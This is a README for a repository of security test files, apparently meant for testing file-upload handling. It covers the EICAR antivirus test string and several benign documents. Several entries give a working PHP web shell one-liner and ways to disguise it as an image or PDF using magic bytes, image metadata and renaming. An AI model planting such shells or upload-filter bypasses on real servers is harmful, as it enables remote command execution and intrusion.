# security-test-files
Different files created to help with security testing applications.

> [!IMPORTANT]
> The EICAR files will probably trigger your anti-virus software. These are however non-malicious files. Read more below.

### What is EICAR?
[EICAR Anti-Virus Test File](https://www.eicar.org/download-anti-malware-testfile/) is a file made for testing anti-virus software without using real malware. The EICAR test file is a bening file that gets flagged as a virus by anti-virus software.

The file is a legitimate DOS program that consists of 68 printable ASCII characters. It will print the message "EICAR-STANDARD-ANTIVIRUS-TEST-FILE!" if run.

### Files and instructions how to create them yourself

#### eicar-excel-document.xlsx
- Create a new document in Excel and navigate to -> Insert -> Text -> Object -> Create from File and attach EICAR text file

#### eicar-text-document.txt
- Create a new text document and paste the following string to it
- `X5O!P%@AP[4\PZX54(P^)7CC)7}$EICAR-STANDARD-ANTIVIRUS-TEST-FILE!$H+H*`

#### eicar-word-document.docx
- Create a new document in Word and navigate to -> Insert -> Object -> Create from File and attach EICAR text file

#### php-shell.php
- PHP file with a PHP shell in it
- `echo '<?php system($_REQUEST['cmd']); ?>' >> php-shell.php`

#### php-shell-added-to-end-png-magic-bytes.php
- added PHP shell payload to the end of png file
- `echo '<?php system($_REQUEST['cmd']); ?>' >> regular-png-file.png && mv regular-png-file.png php-shell-added-to-end-png-magic-bytes.php`

#### php-shell-directly-in-image.png
- PHP shell added directly to image
- `echo '<?php system($_REQUEST['cmd']); ?>' >> php-shell-directly-in-image.png`

#### php-shell-with-jpeg-magic-bytes.php
- PHP shell file with added jpeg magic bytes
- Changed the first bytes to these using hexedit: ffd8 ffdb

#### php-shell-with-pdf-magic-bytes.php
- PHP shell file with added pdf magic bytes
- Changed the first bytes to these using hexedit: 2550 4446 2d

#### php-shell-with-php-payload-in-png-comment-metadata-png-magic-bytes.php
- PHP shell payload inserted into png comment and changed the file to `.php`
- `exiftool -comment='<?php system($_REQUEST['cmd']); ?>' png-file-with-php-payload-in-comment-metadata.png`
- renamed png-file-with-php-payload-in-comment-metadata.png to php-shell-with-php-payload-in-png-comment-metadata-png-magic-bytes.php

#### png-file-with-php-payload-in-comment-metadata.png
- PHP payload added in the metadata comment section
- `exiftool -comment='<?php system($_REQUEST['cmd']); ?>' png-file-with-php-payload-in-comment-metadata.png`

#### regular-excel-document.xlsx
- nothing special, just an excel sheet with some text and `=1+1` calculation

#### regular-pdf-document.pdf
- nothing special, just a pdf file with some text

#### regular-png-file.png
- nothing special, just a png file

#### regular-text-document.txt
- nothing special, just a text document with some text

#### regular-word-document.docx
- nothing special, just a word document with some text
